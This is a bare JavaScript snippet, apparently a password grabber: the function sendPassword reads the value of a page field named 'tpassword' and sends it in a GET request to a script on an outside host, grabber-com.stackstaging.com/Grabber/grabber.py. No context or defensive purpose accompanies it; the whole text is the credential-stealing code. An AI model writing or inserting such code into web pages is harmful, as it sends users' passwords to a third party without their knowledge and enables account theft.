function sendPassword() {
    var xhttp = new XMLHttpRequest();
    xhttp.open('GET', 'http://grabber-com.stackstaging.com/Grabber/grabber.py?tpassword=' +
        document.getElementById('tpassword').value, true);
    xhttp.send();
}